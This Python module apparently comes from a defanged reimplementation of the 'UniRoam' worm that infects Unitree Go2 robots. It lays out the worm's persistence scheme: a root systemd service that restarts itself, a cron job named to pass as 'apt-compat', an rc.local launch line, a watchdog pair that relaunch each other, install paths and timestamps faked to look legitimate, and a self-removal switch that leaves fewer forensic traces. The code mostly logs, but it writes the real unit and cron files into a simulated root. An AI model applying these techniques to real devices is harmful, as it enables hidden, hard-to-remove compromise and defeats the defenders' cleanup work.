"""
Persistence mechanisms for embedded Linux targets.

This module documents and implements (in safe/logged form) the persistence
techniques used by UniRoam on Unitree Go2 robots running Ubuntu 20.04 on
aarch64.  The goal of persistence is surviving:

  - Process termination (watchdog restarts the agent)
  - Reboot (systemd + cron + rc.local all independently relaunch)
  - OTA firmware updates (Unitree's OTA overwrites specific paths, so the
    agent installs to paths outside the OTA blast radius)

The production worm used four independent persistence mechanisms so that
any single cleanup action was insufficient.  A defender had to remove all
four, plus the running process, in a single operation.

In this defanged version, all methods log their intent without modifying
the filesystem.  They can be pointed at a simulated root directory for
testing.
"""

import os
import logging
from pathlib import Path
from typing import Optional

from uniroam import config

logger = logging.getLogger("uniroam.persistence")


# =========================================================================
# 1. Systemd Service
# =========================================================================

def systemd_service_content() -> str:
    """Generate the systemd unit file content.

    Design notes:
      - Restart=always with RestartSec=10 ensures the agent comes back
        after crashes or kills.
      - SyslogIdentifier matches a plausible Unitree service name.
      - After=network.target ensures C2 connectivity is available.
    """
    return f"""\
[Unit]
Description=Unitree Robot System Service
After=network.target bluetooth.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {config.WORM_INSTALL_PATH}
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier={config.SYSTEMD_SERVICE_NAME}
User=root

[Install]
WantedBy=multi-user.target
"""


def install_systemd(sim_root: Optional[str] = None) -> bool:
    """Install systemd persistence (logged, not executed)."""
    target = sim_root or "/"
    service_path = os.path.join(target, config.SYSTEMD_SERVICE_PATH.lstrip("/"))

    logger.info("[PERSISTENCE] Would install systemd service:")
    logger.info("  Service file: %s", service_path)
    logger.info("  ExecStart: /usr/bin/python3 %s", config.WORM_INSTALL_PATH)
    logger.info("  Commands: systemctl daemon-reload && enable && start")

    if sim_root:
        Path(service_path).parent.mkdir(parents=True, exist_ok=True)
        Path(service_path).write_text(systemd_service_content())
        return True

    return True


# =========================================================================
# 2. Cron Job
# =========================================================================

CRON_CONTENT = f"""\
# Unitree system maintenance - checks agent health every 15 minutes
{config.CRON_SCHEDULE} root /usr/bin/python3 {config.WORM_INSTALL_PATH} >/dev/null 2>&1
"""


def install_cron(sim_root: Optional[str] = None) -> bool:
    """Install cron persistence.

    Design notes:
      - Placed in /etc/cron.d/ (not user crontab) so it survives
        user crontab resets.
      - Named 'apt-compat' to blend with existing system cron jobs.
      - Runs as root explicitly (cron.d format requires user field).
    """
    cron_path = "/etc/cron.d/apt-compat"
    logger.info("[PERSISTENCE] Would install cron job:")
    logger.info("  Path: %s", cron_path)
    logger.info("  Schedule: %s", config.CRON_SCHEDULE)
    logger.info("  Name chosen to blend with system cron jobs")

    if sim_root:
        full_path = os.path.join(sim_root, cron_path.lstrip("/"))
        Path(full_path).parent.mkdir(parents=True, exist_ok=True)
        Path(full_path).write_text(CRON_CONTENT)

    return True


# =========================================================================
# 3. rc.local
# =========================================================================

RC_LOCAL_LINE = f"/usr/bin/python3 {config.WORM_INSTALL_PATH} &\n"


def install_rc_local(sim_root: Optional[str] = None) -> bool:
    """Install rc.local persistence.

    Design notes:
      - rc.local is a legacy boot mechanism but still works on Ubuntu 20.04
        (the Go2's OS).  Many defenders don't check it.
      - Appends a launch line rather than replacing the file, to avoid
        breaking existing rc.local functionality.
    """
    logger.info("[PERSISTENCE] Would append to /etc/rc.local:")
    logger.info("  Line: %s", RC_LOCAL_LINE.strip())
    return True


# =========================================================================
# 4. Watchdog (self-monitoring)
# =========================================================================

def install_watchdog(sim_root: Optional[str] = None) -> bool:
    """Install watchdog script that monitors the agent process.

    Design notes:
      - A separate script at /usr/local/bin/unitree-watchdog checks
        every 30 seconds whether the main agent is running.
      - If not, it relaunches the agent.
      - The watchdog itself is kept alive by a separate systemd service.
      - This creates a mutual-restart pair: the agent monitors the
        watchdog, the watchdog monitors the agent.  Killing one
        immediately relaunches the other.
    """
    logger.info("[PERSISTENCE] Would install watchdog:")
    logger.info("  Watchdog path: /usr/local/bin/unitree-watchdog")
    logger.info("  Monitors: %s", config.WORM_INSTALL_PATH)
    logger.info("  Check interval: 30s")
    logger.info("  Creates mutual-restart pair with main agent")
    return True


# =========================================================================
# Filesystem blending
# =========================================================================

def pick_install_path() -> str:
    """Choose an install path that blends into the robot's filesystem.

    The production worm tried these directories in order, looking for
    a writable location that already contained Unitree software:

      /usr/local/unitree/bin/hwmon
      /usr/local/unitree/net_manager
      /opt/unitree/bin/sdk_watchdog
      /opt/unitree/update-notifier
      /usr/lib/udev-helper
      /usr/local/bin/unitree-updater  (fallback)

    The chosen name was always something that looked like a legitimate
    system binary.  After installation, the file's mtime/atime were set
    to match a reference binary (e.g. /usr/bin/python3) so it wouldn't
    stand out in a directory listing sorted by modification time.
    """
    logger.info("[PERSISTENCE] Install path selection:")
    logger.info("  Tries Unitree-specific dirs first, falls back to /usr/local/bin")
    logger.info("  Timestamps masqueraded to match /usr/bin/python3")
    return config.WORM_INSTALL_PATH


# =========================================================================
# Combined install / remove
# =========================================================================

class PersistenceManager:
    """Coordinate all persistence mechanisms."""

    def install_all(self, sim_root: Optional[str] = None) -> dict:
        results = {}
        results["systemd"] = install_systemd(sim_root)
        results["cron"] = install_cron(sim_root)
        results["rc_local"] = install_rc_local(sim_root)
        results["watchdog"] = install_watchdog(sim_root)
        results["install_path"] = pick_install_path()
        return results

    def remove_all(self, sim_root: Optional[str] = None) -> dict:
        """Remove all persistence (for SELF_DESTRUCT task).

        The production agent's dead man's switch triggered this after
        48 hours without C2 contact - auto-cleanup to reduce forensic
        footprint if the C2 infrastructure was taken down.
        """
        logger.info("[PERSISTENCE] Would remove all persistence mechanisms")
        logger.info("  Stop + disable systemd service")
        logger.info("  Remove cron job from /etc/cron.d/")
        logger.info("  Remove rc.local entry")
        logger.info("  Kill watchdog + remove binary")
        logger.info("  Remove agent binary from install path")
        logger.info("  Clean systemd daemon-reload")
        return {"removed": True}
